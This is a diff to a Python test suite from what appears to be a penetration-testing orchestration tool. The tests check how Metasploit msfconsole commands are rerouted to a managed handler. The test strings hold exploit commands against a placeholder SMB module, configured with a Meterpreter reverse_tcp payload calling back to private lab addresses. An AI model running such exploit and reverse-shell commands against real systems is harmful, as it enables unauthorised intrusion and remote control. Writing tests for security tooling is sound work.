@@ -466,15 +466,36 @@ def test_target_tool_risk_normalization_and_http_failure():
 def test_msf_exploit_routes_to_persistent_handler():
     s = make_session()
     s.exploit_lhost = "192.168.100.198"
+    s.exploit_lport = 4444
+    s.exploit_payload = "windows/x64/meterpreter/reverse_tcp"
     command = (
-        'msfconsole -q -x "use exploit/linux/http/example; '
-        'set LHOST 192.168.100.198; set LPORT 4444; exploit -z"'
+        'msfconsole -q -x "use exploit/windows/smb/example; '
+        'set LHOST 192.168.100.50; set LPORT 5555; exploit -z"'
     )
     routed = _route_msf_to_managed_handler(command, s)
+    assert "set PAYLOAD windows/x64/meterpreter/reverse_tcp" in routed
+    assert "set LHOST 192.168.100.198" in routed
+    assert "set LPORT 4444" in routed
     assert "set DisablePayloadHandler true; exploit -z" in routed
+    already_disabled = _route_msf_to_managed_handler(
+        'msfconsole -q -x "use exploit/windows/smb/example; '
+        'set DisablePayloadHandler true; exploit -z"',
+        s,
+    )
+    assert "set PAYLOAD windows/x64/meterpreter/reverse_tcp" in already_disabled
+    assert "set LHOST 192.168.100.198" in already_disabled
+    assert "set LPORT 4444" in already_disabled
+    assert already_disabled.count("set DisablePayloadHandler true") == 1
     assert _route_msf_to_managed_handler("msfconsole -q -x 'use multi/handler; run'", s) == (
         "msfconsole -q -x 'use multi/handler; run'"
     )
+
+
+def test_msf_exploit_is_not_routed_without_complete_handler_config():
+    s = make_session()
+    s.exploit_lhost = "192.168.100.198"
+    command = 'msfconsole -q -x "use exploit/windows/smb/example; exploit -z"'
+    assert _route_msf_to_managed_handler(command, s) == command
 
 
 def test_coverage_is_scoped_to_referenced_host_and_port():
